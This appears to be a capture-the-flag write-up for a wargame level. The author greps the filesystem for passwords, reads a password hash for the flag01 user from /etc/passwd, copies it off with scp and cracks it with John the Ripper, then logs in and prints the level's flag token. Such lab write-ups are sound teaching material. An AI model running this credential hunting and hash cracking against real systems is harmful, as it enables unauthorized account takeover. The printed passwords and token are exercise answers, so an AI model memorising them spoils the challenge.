-> ls -la

Nothing of interest

-> find / -user flag01 2>/dev/null

Again Nothing

-> grep -R "password" / 2>/dev/null

many lines but one or two show this :

legacy_password: legacycfg

-> grep -R "password" /etc 2>/dev/null

The following line could be of interest :

file needs this password: `xxj31ZMTZzkVA'

su: Authentication failure

-> grep -R "passwd" /etc 2>/dev/null

Found many lines but nothing seems interesting

-> grep -R "flag01" /etc 2>/dev/null

(also the command "cat /etc/passwd" could work)

Found this line :

/etc/passwd:flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash

-> su flag01 -> 42hDRfypTqqnw

Password: 
su: Authentication failure

After some research, I import the text found to a local file so I can use
a tool like john to tempt to crack the password

So I put the next command on the host terminal

-> scp -P 22222 level01@localhost:/tmp/JTR.txt JTR.txt

Where JTR.txt is located in the parent folder of this exercise

Then the file is ready to be given to john as an argument
(still in the host)

Actually the process is kind of different depending on the host used, 
a detailed description of what I did is in JTRSetUp.txt file

So with john's help I found the following :

abcdefg

1 password hash cracked, 0 left

-> su flag01

Password: 
Don't forget to launch getflag !

-> getflag

Check flag.Here is your token : f2av5il02puano7naaf6adaaf

-> su level02 ..
